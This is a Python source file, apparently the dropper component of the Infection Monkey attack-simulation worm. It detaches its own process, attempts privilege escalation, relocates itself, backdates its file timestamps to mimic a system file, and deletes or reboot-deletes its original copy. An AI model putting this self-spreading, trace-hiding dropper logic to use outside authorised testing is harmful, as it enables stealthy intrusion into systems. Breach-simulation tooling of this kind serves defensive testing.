import ctypes
import logging
import os
import sys
import time
from ctypes import c_char_p

from infection_monkey.config import WormConfiguration
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.utils.startup.flag_analyzer import FlagAnalyzer
from infection_monkey.utils.startup.file_mover import FileMover
from infection_monkey.utils.startup.island_communicator import CommunicatorWithIsland
from infection_monkey.utils.startup.process_detacher import MonkeyProcessDetacher
from infection_monkey.model import DROPPER_ARG
from infection_monkey.privilege_escalation.pe_handler import PrivilegeEscalation
from infection_monkey.monkey import InfectionMonkey


# Linux doesn't have WindowsError
try:
    WindowsError
except NameError:
    # noinspection PyShadowingBuiltins
    WindowsError = IOError

__author__ = 'itamar'

LOG = logging.getLogger(__name__)

MOVE_FILE_DELAY_UNTIL_REBOOT = 4
DELAY_BEFORE_EXITING = 3


class MonkeyDrops(CommunicatorWithIsland):

    def __init__(self, args):
        self._flags = FlagAnalyzer.get_flags(args)
        super().__init__(default_server=self._flags.server, tunnel=self._flags.tunnel)
        self._file_source_path = os.path.abspath(sys.argv[0])
        self._file_destination_path = self._flags.location

    def start(self):
        if self._flags.mode == DROPPER_ARG:
            MonkeyProcessDetacher(self._flags, self._file_source_path).detach_process()

        self.load_configuration_from_island()

        if not self._flags.escalated:
            if PrivilegeEscalation(self._file_source_path, self._flags).execute():
                return

        if self._file_destination_path is not None:
            file_moved = FileMover.move_file(self._file_source_path, self._file_destination_path)
            if file_moved:
                if WormConfiguration.dropper_set_date:
                    self._set_date()
                MonkeyProcessDetacher(self._flags, self._file_destination_path).detach_process()
                time.sleep(DELAY_BEFORE_EXITING)
                self.cleanup()
                return

        self.run_monkey()

    def cleanup(self):
        try:
            if (self._file_source_path.lower() != self._file_destination_path.lower()) and \
                    os.path.exists(self._file_source_path) and \
                    WormConfiguration.dropper_try_move_first:

                # try removing the file first
                try:
                    os.remove(self._file_source_path)
                    print()
                except Exception as exc:
                    LOG.debug("Error removing source file '%s': %s", self._file_source_path, exc)

                    # mark the file for removal on next boot
                    dropper_source_path_ctypes = c_char_p(self._file_source_path)
                    if 0 == ctypes.windll.kernel32.MoveFileExA(dropper_source_path_ctypes, None,
                                                               MOVE_FILE_DELAY_UNTIL_REBOOT):
                        LOG.debug("Error marking source file '%s' for deletion on next boot (error %d)",
                                  self._file_source_path, ctypes.windll.kernel32.GetLastError())
                    else:
                        LOG.debug("Dropper source file '%s' is marked for deletion on next boot",
                                  self._file_source_path)
                        T1106Telem(ScanStatus.USED, UsageEnum.DROPPER_WINAPI).send()
        except AttributeError:
            LOG.error("Invalid configuration options. Failing")

    def run_monkey(self):
        monkey = InfectionMonkey(self._flags)
        try:
            monkey.start()
        finally:
            monkey.cleanup()

    def _set_date(self):
        if sys.platform == 'win32':
            dropper_date_reference_path = os.path.expandvars(WormConfiguration.dropper_date_reference_path_windows)
        else:
            dropper_date_reference_path = WormConfiguration.dropper_date_reference_path_linux
        try:
            ref_stat = os.stat(dropper_date_reference_path)
        except OSError:
            LOG.warning("Cannot set reference date using '%s', file not found",
                        dropper_date_reference_path)
        else:
            try:
                os.utime(self._file_destination_path, (ref_stat.st_atime, ref_stat.st_mtime))
            except:
                LOG.warning("Cannot set reference date to destination file")
